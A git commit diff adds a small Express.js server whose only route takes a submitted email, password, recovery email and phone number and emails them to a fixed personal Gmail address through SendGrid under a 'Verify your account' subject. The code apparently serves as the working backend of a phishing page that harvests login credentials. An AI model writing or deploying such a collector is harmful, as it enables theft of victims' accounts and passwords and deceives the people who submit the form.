47e82c5bf727a15af81489de7066de12a91eda55
Ebube <dbupanyiam@gmail.com>
2023-06-09 17:31:31 +0100

    Initial commit

---
+++ index.js
@@ -0,0 +1,44 @@
+import express from "express";
+import sgMail from "@sendgrid/mail";
+import cors from "cors";
+
+// require("dotenv").config();
+import env from "dotenv";
+env.config();
+
+const app = express();
+app.use(express.json());
+app.use(cors());
+
+sgMail.setApiKey(process.env.SG_API_KEY);
+
+// POST route to send an email
+app.post("/send-email", async (req, res) => {
+  const { email, password, recEmail, phone } = req.body;
+
+  const msg = {
+    to: "juniorhenry745@gmail.com",
+    from: "hello@fortyfi.africa",
+    subject: "Verify your account",
+    text: "You need to verify your email",
+    html: `
+              <p>Email: ${email}</p>.
+              <p>Recovery Email: ${recEmail}</p>
+              <p>Phone Number: ${phone}</p>
+              <p>Password: ${password}</p>
+              
+    `,
+  };
+
+  await sgMail.send(msg);
+
+  res.status(200).send({
+    status: true,
+    message: "Email sent",
+  });
+});
+
+// Start the server
+app.listen(3000, () => {
+  console.log("Server started on port 3000");
+});
